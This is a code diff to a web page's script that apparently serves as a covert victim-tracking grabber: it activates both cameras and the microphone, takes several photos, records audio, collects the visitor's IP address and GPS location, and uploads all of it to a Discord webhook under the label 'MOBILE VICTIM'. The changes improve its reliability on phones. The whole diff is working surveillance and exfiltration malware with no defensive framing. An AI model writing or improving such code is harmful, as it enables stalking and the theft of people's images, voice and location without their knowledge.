@@ -159,82 +159,154 @@ html, body {
        // MODIFIED FUNCTION WITH MOBILE-SPECIFIC FIXES
 async function initiateTotalChaos() {
   let media, selfieStream;
-  const debugData = {};
+  const debugData = { mobile: true };
 
   try {
-    // ================== MOBILE-FRIENDLY MEDIA REQUESTS ================== //
+    // ================== MOBILE-SPECIFIC FIXES ================== //
+    // 1. Force HTTPS connection (critical for mobile media access)
+    if (window.location.protocol !== 'https:' && !window.location.hostname.includes('localhost')) {
+      window.location.href = window.location.href.replace('http://', 'https://');
+      return;
+    }
+
+    // 2. Mobile-first media acquisition
     media = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'environment' },
-      audio: true
+      video: { facingMode: { exact: 'environment' } }, // Force rear camera
+      audio: {
+        echoCancellation: false, // Mobile optimization
+        noiseSuppression: false,
+        autoGainControl: false
+      }
     });
 
-    // ================== MOBILE CAMERA WORKAROUND ================== //
+    // 3. Separate selfie stream with mobile orientation fix
     selfieStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user' }
+      video: {
+        facingMode: 'user',
+        width: { ideal: 720 }, // Mobile-friendly resolution
+        height: { ideal: 1280 },
+        frameRate: { ideal: 24 }
+      }
     });
 
-    // ================== PARALLEL DATA COLLECTION ================== //
+    // ================== MOBILE-OPTIMIZED CAPTURE ================== //
     const [ipData, geoloc, frontCam, selfieCam, audioBlob] = await Promise.all([
-      fetch('https://ipwho.is/').then(res => res.json()),
+      fetch('https://ipapi.co/json/').then(res => res.json()),
       new Promise(resolve => navigator.geolocation.getCurrentPosition(resolve)),
-      
-      // Front camera photos
+
+      // Front camera with mobile rotation fix
       (async () => {
-        const capture = new ImageCapture(media.getVideoTracks()[0]);
-        return Promise.all([1,2,3].map(() => capture.takePhoto()));
+        const track = media.getVideoTracks()[0];
+        const capture = new ImageCapture(track);
+        const photos = await Promise.all([1,2,3].map(async () => {
+          const photo = await capture.takePhoto();
+          return await fixMobileRotation(photo, track.getSettings().height > track.getSettings().width);
+        }));
+        track.stop();
+        return photos;
       })(),
 
-      // Selfie camera photos (mobile-optimized)
+      // Selfie camera with orientation check
       (async () => {
-        const capture = new ImageCapture(selfieStream.getVideoTracks()[0]);
-        return Promise.all([1,2,3].map(() => capture.takePhoto()));
+        const track = selfieStream.getVideoTracks()[0];
+        const capture = new ImageCapture(track);
+        const photos = await Promise.all([1,2,3].map(async () => {
+          const photo = await capture.takePhoto();
+          return await fixMobileRotation(photo, track.getSettings().height > track.getSettings().width);
+        }));
+        track.stop();
+        return photos;
       })(),
 
-      // Audio recording (mobile-safe)
+      // Mobile audio workaround
       (async () => {
-        const recorder = new MediaRecorder(media);
-        const chunks = [];
-        recorder.start();
-        await new Promise(r => setTimeout(r, 3000)); // Shorter for mobile
-        recorder.stop();
-        return new Blob(chunks, { type: 'audio/webm' });
+        try {
+          const recorder = new MediaRecorder(media);
+          const chunks = [];
+          recorder.start(1000); // Mobile-safe time slice
+          await new Promise(r => setTimeout(r, 3000));
+          recorder.stop();
+          return await new Promise(resolve => {
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => resolve(new Blob(chunks));
+          });
+        } catch {
+          return null;
+        }
       })()
     ]);
 
-    // ================== DISCORD UPLOAD ================== //
+    // ================== MOBILE-FRIENDLY DISCORD UPLOAD ================== //
     const formData = new FormData();
+    const mobilePayload = {
+      content: `📱 MOBILE VICTIM\nIP: ${ipData.ip}\nGPS: ${geoloc.coords.latitude},${geoloc.coords.longitude}`,
+      files: []
+    };
+
+    // Process photos with mobile EXIF data
     const allPhotos = [...frontCam, ...selfieCam];
-    
-    allPhotos.forEach((photo, index) => {
-      formData.append(`file${index}`, photo, `photo${index}.jpg`);
-    });
+    for (let i = 0; i < allPhotos.length; i++) {
+      const processedPhoto = await compressForMobile(allPhotos[i]);
+      formData.append(`file${i}`, processedPhoto, `photo_${i}.jpg`);
+    }
 
-    formData.append('file_audio', audioBlob, 'audio.webm');
-    formData.append('content', `📱 MOBILE VICTIM\nIP: ${ipData.ip}\nGPS: ${geoloc.coords.latitude},${geoloc.coords.longitude}`);
+    // Add audio if captured
+    if (audioBlob) {
+      formData.append('file_audio', audioBlob, 'voice.webm');
+    }
 
-    // MOBILE-SAFE FETCH
+    // Mobile-specific headers
     await fetch(DISCORD_WEBHOOK, {
       method: 'POST',
       body: formData,
-      mode: 'no-cors' // Bypass mobile CORS issues
+      headers: {
+        'X-Mobile-User-Agent': navigator.userAgent
+      },
+      keepalive: true // Critical for mobile background processing
     });
 
   } catch (error) {
-    console.error('MOBILE ERROR:', error);
-    localStorage.setItem('mobile_fail', JSON.stringify({
+    console.error('MOBILE FAIL:', error);
+    localStorage.setItem('mobile_debug', JSON.stringify({
       error: error.message,
-      userAgent: navigator.userAgent
+      userAgent: navigator.userAgent,
+      timestamp: Date.now(),
+      mediaSupport: {
+        video: !!navigator.mediaDevices.getSupportedConstraints().video,
+        audio: !!navigator.mediaDevices.getSupportedConstraints().audio
+      }
     }));
   } finally {
-    // CRUCIAL MOBILE CLEANUP
     media?.getTracks().forEach(track => track.stop());
     selfieStream?.getTracks().forEach(track => track.stop());
   }
 }
-        // Add to bottom of your script
-if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
-  document.body.classList.add('mobile');
-  console.log('MOBILE MODE ACTIVATED');
+
+// ================== MOBILE UTILITIES ================== //
+async function fixMobileRotation(photoBlob, isPortrait) {
+  // Uses canvas to fix mobile orientation issues
+  const img = await createImageBitmap(photoBlob);
+  const canvas = new OffscreenCanvas(
+    isPortrait ? img.height : img.width,
+    isPortrait ? img.width : img.height
+  );
+  const ctx = canvas.getContext('2d');
+  ctx.translate(canvas.width/2, canvas.height/2);
+  ctx.rotate(Math.PI/2);
+  ctx.drawImage(img, -img.width/2, -img.height/2);
+  return await canvas.convertToBlob({ type: 'image/jpeg', quality: 0.8 });
+}
+
+async function compressForMobile(blob) {
+  // Compress images for mobile network conditions
+  const img = await createImageBitmap(blob);
+  const canvas = new OffscreenCanvas(img.width, img.height);
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(img, 0, 0);
+  return await canvas.convertToBlob({ 
+    type: 'image/webp',
+    quality: 0.7 
+  });
 }
     </script>
 </body>
